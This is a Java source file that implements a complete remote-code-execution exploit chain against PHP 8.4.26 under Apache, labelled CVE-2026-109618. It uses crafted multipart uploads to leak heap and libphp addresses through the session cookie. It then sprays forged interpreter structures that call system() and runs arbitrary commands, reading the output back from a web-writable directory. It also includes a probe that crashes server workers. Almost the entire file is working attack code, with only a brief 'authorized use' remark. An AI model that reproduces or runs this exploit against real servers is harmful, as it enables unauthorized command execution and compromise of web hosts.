package p2s;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.function.Consumer;

/**
 * PHP2Shell 全链（CVE-2026-109618）—— 移植自 78ResearchLab 的 exploit.py，内置于 jar。
 *
 * 流程：
 *   1) infoleak：一次 abort 把 PS(id) 变成悬垂，再用 892 个 48 字节 filler + 一个 79 字节
 *      伪造 zend_string 去回收它，服务端把堆内容 URL-encode 进 PHPSESSID cookie
 *      → chunk base（页对齐堆指针）与 libphp base（与 dtor 偏移对齐的指针）
 *   2) r0 扫描：伪造 HashTable + zend_op_array（handler = zif_system），喷射 400 份，
 *      按 0x1000 步长扫 r0，每请求打包 4 个低 3 位
 *   3) 验证：命令输出写到可写 web 目录，再 GET 回来（文件 oracle）
 *
 * 只对匹配构建有效（默认 php:8.4.26-apache）。仅授权环境使用。
 */
public final class RceEngine {

    /* ---- 与载荷配套的常量（按 php:8.4.26-apache 量的，换镜像需重算） ---- */
    public static long ZIF_OFF = 0x465370L;     // zif_system 相对 libphp 的偏移
    public static long DTOR_OFF = 0x65EB60L;    // 用于识别 libphp base 的指针偏移
    private static final long PTR_MIN = 0x700000000000L, PTR_MAX = 0x800000000000L;
    private static final int HUGE_MB = 12;
    private static final int STAGE1_FILLERS = 892;
    private static final int STAGE2_WINDOW = 0x20000;
    private static final int STAGE2_ARRAYS = 150;
    private static final int STAGE3_PADS = 32;
    private static final int HT_PAGE_OFFSET = 0x800;
    private static final int SPRAY_VLEN = 4071;
    private static final int SPRAY_COUNT = 400;
    private static final byte[] SID = "attacksessionid0001".getBytes(StandardCharsets.ISO_8859_1);
    private static final byte[] BND_A = "S".repeat(17).getBytes(StandardCharsets.ISO_8859_1);
    private static final byte[] BND_B = "B".repeat(10).getBytes(StandardCharsets.ISO_8859_1);
    private static final byte[] BND_R = "BNDRY12345".getBytes(StandardCharsets.ISO_8859_1);

    public int timeoutMs = 120_000;

    /** filler 数量是"运行时堆布局"的一部分：泄漏会告诉我们实际命中第几个，据此自校准 */
    private int fillers = STAGE1_FILLERS;

    /* ------------------------------ 数据结构 ------------------------------ */
    public static class Leak {
        public long chunk, libphp;
        public byte[] raw = new byte[0];
        /** 诊断用：最后一次 stage1 泄漏请求拿回多少字节、开头是什么 */
        public int stage1RawLen;
        public String stage1Head = "";
        /** stage1 原文（latin1）：用来判断是不是"服务端新建了一个会话 id" */
        public String stage1Text = "";

        /** 拿回的是不是合法会话 id 形状（说明没泄漏，只是服务端新建了一个） */
        public boolean stage1LooksLikeFreshSid() {
            return stage1Text.matches("[A-Za-z0-9,+\\-]{22,256}");
        }

        public boolean ok() { return chunk != 0 && libphp != 0; }
    }

    public static class Part {
        public String name; public String filename; public byte[] data;
        Part(String n, String fn, byte[] d) { name = n; filename = fn; data = d; }
    }

    private static Part part(String name, byte[] data) { return new Part(name, null, data); }

    private static Part filePart() {
        return new Part("f", "a.txt", "A".repeat(64).getBytes(StandardCharsets.ISO_8859_1));
    }

    private static Part oomPart() {
        return part("big", "B".repeat(HUGE_MB * 1024 * 1024).getBytes(StandardCharsets.ISO_8859_1));
    }

    /* ------------------------------ 组包 ------------------------------ */
    private static byte[] multipart(List<Part> parts, byte[] boundary) {
        ByteArrayOutputStream o = new ByteArrayOutputStream(16 << 20);
        for (Part p : parts) {
            o.writeBytes("--".getBytes(StandardCharsets.ISO_8859_1));
            o.writeBytes(boundary);
            o.writeBytes("\r\nContent-Disposition: form-data; name=\"".getBytes(StandardCharsets.ISO_8859_1));
            o.writeBytes(p.name.getBytes(StandardCharsets.ISO_8859_1));
            o.write('"');
            if (p.filename != null) {
                o.writeBytes("; filename=\"".getBytes(StandardCharsets.ISO_8859_1));
                o.writeBytes(p.filename.getBytes(StandardCharsets.ISO_8859_1));
                o.writeBytes("\"\r\nContent-Type: application/octet-stream".getBytes(StandardCharsets.ISO_8859_1));
            }
            o.writeBytes("\r\n\r\n".getBytes(StandardCharsets.ISO_8859_1));
            o.writeBytes(p.data);
            o.writeBytes("\r\n".getBytes(StandardCharsets.ISO_8859_1));
        }
        o.writeBytes("--".getBytes(StandardCharsets.ISO_8859_1));
        o.writeBytes(boundary);
        o.writeBytes("--\r\n".getBytes(StandardCharsets.ISO_8859_1));
        return o.toByteArray();
    }

    private byte[] post(String url, List<Part> parts, byte[] boundary) throws Exception {
        byte[] body = multipart(parts, boundary);
        Probe.Resp r = Probe.post(url, body, "multipart/form-data; boundary="
                + new String(boundary, StandardCharsets.ISO_8859_1), timeoutMs);
        return r.body;
    }

    /** abort 类请求本来就会让服务端断连接，异常属于预期 */
    private void postSafe(String url, List<Part> parts, byte[] boundary) {
        try {
            post(url, parts, boundary);
        } catch (Exception ignored) {
            // 服务端在 OOM 后直接断连接，正常
        }
    }

    /* --------------------------- cookie / 解码 --------------------------- */
    private static String cookieOf(byte[] respBody) {
        String s = new String(respBody, StandardCharsets.ISO_8859_1);
        int i = s.indexOf("PHPSESSID=");
        if (i < 0) return "";
        int end = s.indexOf(';', i);
        if (end < 0) end = Math.min(i + 11 + 4096, s.length());
        return s.substring(i + 10, Math.max(i + 10, Math.min(end, s.length())));
    }

    private static byte[] percentDecode(String s) {
        ByteArrayOutputStream o = new ByteArrayOutputStream(s.length());
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '%' && i + 2 < s.length()) {
                try {
                    o.write(Integer.parseInt(s.substring(i + 1, i + 3), 16));
                    i += 2;
                    continue;
                } catch (NumberFormatException ignored) { }
            }
            o.write((byte) c);
        }
        return o.toByteArray();
    }

    /* --------------------------- 指针扫描 --------------------------- */
    private static long chunkBase(byte[] raw) {
        if (raw.length < 1000) return 0;
        Map<Long, Integer> counts = new HashMap<>();
        for (int i = 0; i + 8 <= raw.length; i++) {
            long v = leLong(raw, i);
            if (v >= PTR_MIN && v < PTR_MAX) counts.merge(v & ~0x1FFFFFL, 1, Integer::sum);
        }
        long best = 0; int n = 0;
        for (var e : counts.entrySet()) if (e.getValue() > n) { n = e.getValue(); best = e.getKey(); }
        return n >= 8 ? best : 0;
    }

    private static long libphpBase(byte[] raw, long dtorOff) {
        if (raw.length < 16) return 0;
        Map<Long, Integer> counts = new HashMap<>();
        for (int i = 0; i + 8 <= raw.length; i += 8) {
            long v = leLong(raw, i);
            if (v >= PTR_MIN && v < PTR_MAX && Math.floorMod(v - dtorOff, 0x1000L) == 0)
                counts.merge(v, 1, Integer::sum);
        }
        long best = 0; int n = 0;
        for (var e : counts.entrySet()) if (e.getValue() > n) { n = e.getValue(); best = e.getKey(); }
        return n >= 4 ? best - dtorOff : 0;
    }

    private static long leLong(byte[] b, int off) {
        long v = 0;
        for (int i = 7; i >= 0; i--) v = (v << 8) | (b[off + i] & 0xFFL);
        return v;
    }

    /** 诊断用：把前 n 字节转成十六进制 */
    private static String hex(byte[] b, int n) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < Math.min(n, b.length); i++) sb.append(String.format("%02x", b[i]));
        return sb.toString();
    }

    private static void putInt(byte[] b, int off, int v) {
        b[off] = (byte) (v & 0xff); b[off + 1] = (byte) ((v >>> 8) & 0xff);
        b[off + 2] = (byte) ((v >>> 16) & 0xff); b[off + 3] = (byte) ((v >>> 24) & 0xff);
    }

    private static void putLong(byte[] b, int off, long v) {
        for (int i = 0; i < 8; i++) b[off + i] = (byte) ((v >>> (8 * i)) & 0xff);
    }

    /* ------------------------------ 各阶段 ------------------------------ */
    private void trigger(String url) {
        List<Part> ps = new ArrayList<>();
        ps.add(part("PHPSESSID", "a".repeat(19).getBytes(StandardCharsets.ISO_8859_1)));
        ps.add(part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1)));
        for (int i = 0; i < STAGE3_PADS; i++) {
            ps.add(part(String.format("p%06d", i).substring(0, 7),
                    "V".repeat(7).getBytes(StandardCharsets.ISO_8859_1)));
        }
        ps.add(filePart());
        ps.add(oomPart());
        postSafe(url, ps, BND_A);
        sleep(300);
    }

    /** 清一次状态，让下一次 leak 从干净堆开始 */
    private void rotate(String url) {
        List<Part> ps = new ArrayList<>();
        for (int i = 0; i < 1001; i++)
            ps.add(part(String.format("f%04d", i).substring(0, 5),
                    "V".repeat(3000).getBytes(StandardCharsets.ISO_8859_1)));
        ps.add(part("PHPSESSID", new byte[]{0}));
        ps.add(part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1)));
        ps.add(filePart());
        ps.add(oomPart());
        postSafe(url, ps, BND_A);
        sleep(300);
        postSafe(url, List.of(part("PHPSESSID", SID),
                part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1))), BND_R);
        sleep(500);
    }

    /** 一次泄漏尝试：返回 PHPSESSID cookie 解码后的堆字节 */
    public byte[] leakRequest(String url, int window, int arrays, int fillers) {
        List<Part> ps = new ArrayList<>();
        for (int i = 0; i < 1001; i++) ps.add(part(String.format("p%04d", i), new byte[]{'x'}));
        ps.add(part("PHPSESSID", new byte[]{0}));
        ps.add(part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1)));
        ps.add(filePart());
        ps.add(oomPart());
        postSafe(url, ps, BND_A);
        sleep(200);

        List<Part> ps2 = new ArrayList<>();
        ps2.add(part("PHPSESSID", SID));
        ps2.add(part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1)));
        for (int i = 0; i < fillers; i++) {
            String v = String.format("v%04d", i) + "x".repeat(44);
            ps2.add(part(String.valueOf(1000 + i), v.substring(0, 48).getBytes(StandardCharsets.ISO_8859_1)));
        }
        byte[] forge = new byte[79];
        Arrays.fill(forge, (byte) 'A');
        putLong(forge, 0x10, window);
        forge[0x18] = (byte) 'L';
        ps2.add(part("1999", forge));
        for (int i = 0; i < arrays; i++) ps2.add(part(String.format("a%04d[0]", i), new byte[]{'x'}));

        Probe.Resp r;
        try {
            r = Probe.post(url, multipart(ps2, BND_B),
                    "multipart/form-data; boundary=" + new String(BND_B, StandardCharsets.ISO_8859_1), timeoutMs);
        } catch (Exception e) {
            return new byte[0];
        }
        for (String c : r.headers("Set-Cookie")) {
            if (c != null && c.trim().regionMatches(true, 0, "PHPSESSID=", 0, 10)) {
                String v = c.trim().substring(10);
                int semi = v.indexOf(';');
                if (semi >= 0) v = v.substring(0, semi);
                return percentDecode(v);
            }
        }
        String fromBody = cookieOf(r.body);
        return fromBody.isEmpty() ? new byte[0] : percentDecode(fromBody);
    }

    /** 若泄漏回来的内容是 vNNNNxxxx…，说明悬垂串被第 NNNN 个 filler 回收了 → 把 fillers 调成它 */
    private void recalibrate(byte[] raw) {
        if (raw.length < 8) return;
        String s = new String(raw, StandardCharsets.ISO_8859_1);
        java.util.regex.Matcher m = java.util.regex.Pattern.compile("^v(\\d{4})x+$").matcher(s);
        if (m.find()) {
            int idx = Integer.parseInt(m.group(1));
            if (idx != 0 && idx != fillers) {
                fillers = idx;
            }
        }
    }

    public Leak leakOnce(String url, int retries) {
        Leak out = new Leak();
        rotate(url);
        for (int i = 0; i < retries; i++) {
            byte[] raw = leakRequest(url, 0x1000, 0, fillers);
            out.stage1RawLen = raw.length;
            out.stage1Head = hex(raw, 16);
            out.stage1Text = new String(raw, StandardCharsets.ISO_8859_1);
            out.chunk = chunkBase(raw);
            if (out.chunk != 0) break;
            recalibrate(raw);           // ← 关键：按泄漏结果调整 filler 数量
            rotate(url);
        }
        if (out.chunk == 0) return out;
        byte[] raw = leakRequest(url, STAGE2_WINDOW, STAGE2_ARRAYS, fillers);
        out.libphp = libphpBase(raw, DTOR_OFF);
        int tries = 0;
        while (out.libphp == 0 && tries++ < retries) {
            recalibrate(raw);
            rotate(url);
            raw = leakRequest(url, STAGE2_WINDOW, STAGE2_ARRAYS, fillers);
            out.libphp = libphpBase(raw, DTOR_OFF);
        }
        out.raw = raw;
        return out;
    }

    /* --------------------------- 伪造结构 --------------------------- */
    private static byte[] payload(long htdata, long zif, byte[] cmd) {
        byte[] ht = new byte[0x98 + cmd.length + 1];
        putInt(ht, 0x00, 1); putInt(ht, 0x04, 7);
        putInt(ht, 0x08, 0x10); putInt(ht, 0x0C, 0xFFFFFFF8);
        putLong(ht, 0x10, htdata + 0x20);
        putInt(ht, 0x18, 1); putInt(ht, 0x1C, 1);
        putInt(ht, 0x20, 8); putInt(ht, 0x24, 0);
        putLong(ht, 0x30, zif);
        int E = 0x20;
        putInt(ht, E + 0x08, 6);
        putLong(ht, E + 0x10, zif);
        putInt(ht, E + 0x2C, 1);
        putLong(ht, E + 0x50, htdata + 0x80);
        putInt(ht, E + 0x58, 6);
        putInt(ht, 0x80, 1); putInt(ht, 0x84, 0x106);
        putLong(ht, 0x90, cmd.length);
        System.arraycopy(cmd, 0, ht, 0x98, cmd.length);
        return ht;
    }

    private static byte[] packedValue(long page, long zif, byte[] cmd, int[] lowbits) {
        long htdata = page + HT_PAGE_OFFSET;
        byte[] ht = payload(htdata, zif, cmd);
        byte[] buf = new byte[SPRAY_VLEN];
        Arrays.fill(buf, (byte) '.');
        int htOff = HT_PAGE_OFFSET - 0x18;
        for (int low : lowbits) {
            int ro = (low & 0xFFF) - 0x18;
            if (ro < 0 || ro + 0x20 > SPRAY_VLEN) continue;
            if (ro < htOff + ht.length && htOff < ro + 0x20) continue;   // 与伪造结构重叠则跳过
            putInt(buf, ro, 1); putInt(buf, ro + 4, 10);
            putLong(buf, ro + 0x08, htdata);
            putLong(buf, ro + 0x10, 0x307);
            putLong(buf, ro + 0x18, 0);
        }
        System.arraycopy(ht, 0, buf, htOff, Math.min(ht.length, buf.length - htOff));
        return buf;
    }

    private void stage3Packed(String url, long chunk, long zif, int pageOff, int[] lowbits, byte[] cmd) {
        long page = (chunk + pageOff) & ~0xFFFL;
        byte[] val = packedValue(page, zif, cmd, lowbits);
        trigger(url);
        List<Part> ps = new ArrayList<>();
        ps.add(part("PHPSESSID", SID));
        ps.add(part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1)));
        for (int i = 0; i < SPRAY_COUNT; i++) ps.add(part(String.format("s%03d", i), val));
        postSafe(url, ps, BND_B);
    }

    /* ------------------------------ 链路判定 ------------------------------ */
    /** 链路判定结果：工具能观测到的"哪条链在这台目标上成立" */
    public static class ChainProbe {
        public String version = "";
        public boolean startupOom;          // 请求启动期 OOM 是否命中
        public boolean workerAlive;         // 中止后 worker 是否还活着
        public boolean leakOk;              // 跨请求脏状态能否被消费（A 链前提）
        public boolean teardownDamage;      // 同请求清理阶段被破坏（B 链征象：worker 被打死/连接被重置）
        public String chain = "none";       // A / B / none
        public String note = "";
    }

    /** A 链（跨请求）：只有泄漏成功才说明脏 PS(id) 被消费 */
    public boolean chainAAvailable(String url) {
        try {
            return leakOnce(url, 2).ok();
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * B 链（同请求 teardown）：让 OOM 落在 POST 变量的 hash 插入中（大量长字段名），
     * 这样清理阶段会遍历到未初始化的 bucket。远程可观测的征象只有"worker 被杀/连接被重置"，
     * 因此这里只能给出"促发/未促发"，不能声称已拿到执行。
     */
    public boolean chainBTeardownDamage(String url) {
        List<Part> ps = new ArrayList<>();
        ps.add(part("PHPSESSID", SID));
        ps.add(part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1)));
        // 大量 1KB 长字段名：把压力压在 zend_hash_str_add_or_update 的 key 分配上
        for (int i = 0; i < 1200; i++) {
            String name = String.format("k%04d", i) + "A".repeat(1019);
            ps.add(part(name, new byte[]{'v'}));
        }
        boolean reset = false;
        try {
            post(url, ps, BND_A);
        } catch (Exception e) {
            reset = true;   // 连接被重置 = 服务端在 teardown 阶段死了
        }
        boolean alive;
        try {
            alive = Probe.get(url, 8000).status > 0;
        } catch (Exception e) {
            alive = false;      // 连不上 = worker 已经没了
        }
        return reset || !alive;
    }

    /**
     * 自动判定：先看启动期 OOM 是否可达，再看 A 链能否夺到堆，最后试 B 链的 teardown 破坏。
     * 返回 chain = "A"（可 RCE）/ "B"（路径命中但未武器化）/ "none"。
     */
    public ChainProbe probeChain(String url) {
        ChainProbe p = new ChainProbe();
        try {
            Probe.Resp r = Probe.get(url, 10000);
            java.util.regex.Matcher m = java.util.regex.Pattern
                    .compile("PHP/(\\d+\\.\\d+\\.\\d+)").matcher(String.valueOf(r.header("X-Powered-By"))
                            + " " + String.valueOf(r.header("Server")));
            if (m.find()) p.version = m.group(0);
        } catch (Exception ignored) { }

        Probe.Trigger t = Probe.trigger(url, timeoutMs);
        p.startupOom = t.hit;
        p.workerAlive = Boolean.TRUE.equals(t.aliveAfter);

        // 以「A 链能否夺到堆」为准：它成功就说明 OOM + 跨请求脏状态都成立，
        // 即使 abort 请求的响应体读不到 fatal（连接被重置时很常见）。
        p.leakOk = chainAAvailable(url);
        if (p.leakOk) {
            p.startupOom = true;
            p.chain = "A";
            p.note = "跨请求脏状态可被消费（PS(id) 悬垂 → filler 回收）→ 可执行 RCE";
            return p;
        }

        if (!p.startupOom) {
            p.chain = "none";
            p.note = "启动期 OOM 未在响应里体现，且 A 链夺堆失败：可能 memory_limit=-1、"
                    + "请求体被限制、或已被 WAF 拦";
            return p;
        }

        p.teardownDamage = chainBTeardownDamage(url);
        p.chain = p.teardownDamage ? "B" : "none";
        p.note = p.teardownDamage
                ? "同请求 teardown 阶段被破坏（worker 被打死/连接重置），但本工具未武器化这条链"
                : "A 链夺堆失败，且未观察到 teardown 破坏；该目标构建/配置与现有载荷不匹配";
        return p;
    }

    /* ------------------------------ 对外 API ------------------------------ */
    /** 诊断：跑一次泄漏请求，打印各步骤的实际结果（排查移植差异用）。 */
    public String debugLeak(String url) {
        StringBuilder sb = new StringBuilder();
        rotate(url);
        sb.append("rotate done\n");
        byte[] raw1 = leakRequest(url, 0x1000, 0, STAGE1_FILLERS);
        sb.append(String.format("stage1: raw=%d bytes  chunkBase=0x%x%n", raw1.length, chunkBase(raw1)));
        if (raw1.length > 0) {
            sb.append("  head: ");
            for (int i = 0; i < Math.min(24, raw1.length); i++) sb.append(String.format("%02x ", raw1[i]));
            sb.append('\n');
        }
        byte[] raw2 = leakRequest(url, STAGE2_WINDOW, STAGE2_ARRAYS, STAGE1_FILLERS);
        sb.append(String.format("stage2: raw=%d bytes  libphpBase=0x%x%n",
                raw2.length, libphpBase(raw2, DTOR_OFF)));
        try {
            Probe.Resp r = Probe.post(url, multipart(List.of(
                            part("PHPSESSID", SID),
                            part("PHP_SESSION_UPLOAD_PROGRESS", "pwn".getBytes(StandardCharsets.ISO_8859_1))), BND_R),
                    "multipart/form-data; boundary=" + new String(BND_R, StandardCharsets.ISO_8859_1), 20000);
            sb.append(String.format("small request: status=%d set-cookie=%s%n",
                    r.status, r.headers("Set-Cookie")));
        } catch (Exception e) {
            sb.append("small request failed: ").append(e).append('\n');
        }
        return sb.toString();
    }

    /** 自动：先判定链路，A 链则真的执行命令；B 链只如实报告"可达但未武器化" */
    public String execAuto(String base, String cmd, String outDir, String urlPath,
                           int r0Lo, int r0Hi, int[] lowbits, Consumer<String> log) {
        Consumer<String> lg = log == null ? s -> { } : log;
        lg.accept("[0] 自动判定链路（启动期 OOM → 夺堆 → teardown）…");
        ChainProbe p = probeChain(base);
        lg.accept("    版本=" + (p.version.isEmpty() ? "未知" : p.version)
                + "  启动期OOM=" + p.startupOom
                + "  worker存活=" + p.workerAlive
                + "  A链夺堆=" + p.leakOk
                + "  B链破坏=" + p.teardownDamage);
        lg.accept("    判定 " + p.chain + "：" + p.note);
        if ("A".equals(p.chain)) {
            return exec(base, cmd, outDir, urlPath, r0Lo, r0Hi, lowbits, lg);
        }
        if ("B".equals(p.chain)) {
            return "【B 链命中，未武器化】\n"
                    + "  归属：CVE-2026-109618（同请求 teardown：清理阶段遍历到被 OOM 打断的 hash bucket）\n"
                    + "  证据：中止后 worker 被打死或连接被重置\n"
                    + "  现状：本工具只做到「促发 + 检出」，没有该链的伪造 zval → 对象 dtor 写入实现\n"
                    + "  结论：漏洞可达，RCE 未验证";
        }
        return "未判定出可用链路：" + p.note;
    }

    /** 在目标上执行一条命令（文件 oracle：命令输出写到可写 web 目录，再 GET 回来）。 */
    public String exec(String base, String cmd, String outDir, String urlPath,
                       int r0Lo, int r0Hi, int[] lowbits, Consumer<String> progress) {
        Consumer<String> lg = progress == null ? s -> { } : progress;
        lg.accept("[1/3] 信息泄漏（读 PHPSESSID cookie 里的堆字节）…");
        Leak lk = leakOnce(base, 3);
        if (!lk.ok()) {
            String what = lk.stage1LooksLikeFreshSid()
                    ? "拿回来的是服务端新建的会话 id（" + lk.stage1Text + "），说明脏指针没被消费"
                    : (lk.stage1RawLen == 0
                        ? "没拿到 cookie"
                        : "拿回 " + lk.stage1RawLen + " 字节（head=" + lk.stage1Head + "…），不像堆内容");
            return String.format("泄漏失败：chunk=0x%x  libphp=0x%x%n"
                            + "  stage1：%s%n"
                            + "  提示：内置载荷的 zif/dtor 偏移、filler 数量是按官方镜像 php:8.4.26-apache 调校的；%n"
                            + "        同一版本但不同构建（bind mount、不同 ini/Apache 配置）也会失败。%n"
                            + "        换目标（如第三方靶机 8090）或改用「外部脚本」自备载荷。",
                    lk.chunk, lk.libphp, what);
        }
        long zif = lk.libphp + ZIF_OFF;
        lg.accept(String.format("      chunk=0x%x  libphp=0x%x  zif_system=0x%x", lk.chunk, lk.libphp, zif));

        String name = "o" + Integer.toHexString((int) (System.currentTimeMillis() & 0xffffff));
        String wrapped = cmd + " > " + outDir + "/" + name + ".txt 2>&1";
        byte[] cmdBytes = wrapped.getBytes(StandardCharsets.ISO_8859_1);
        if (cmdBytes.length > 256) return "命令过长（包装后 " + cmdBytes.length + " 字节，上限 256）";

        lg.accept(String.format("[2/3] 扫 r0（0x%x..0x%x，每页 %d 个低 3 位）…", r0Lo, r0Hi, lowbits.length));
        int pages = 0;
        for (int p = r0Lo; p < r0Hi; p += 0x1000) {
            pages++;
            stage3Packed(base, lk.chunk, zif, p, lowbits, cmdBytes);
            sleep(200);
            String got = fetch(base, urlPath + "/" + name + ".txt");
            if (got != null && !got.isBlank()) {
                lg.accept(String.format("      命中 r0=0x%x（第 %d 页）", p, pages));
                return got;
            }
        }
        return "未命中：扫完 " + pages + " 页仍无输出（扩大 r0 范围，或目标构建与载荷不匹配）";
    }

    private String fetch(String base, String path) {
        try {
            String url = base.startsWith("http") ? base : "http://" + base;
            int slash = url.indexOf('/', url.indexOf("://") + 3);
            String origin = slash > 0 ? url.substring(0, slash) : url;
            Probe.Resp r = Probe.get(origin + path, 15000);
            if (r.status == 200) return new String(r.body, StandardCharsets.UTF_8);
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
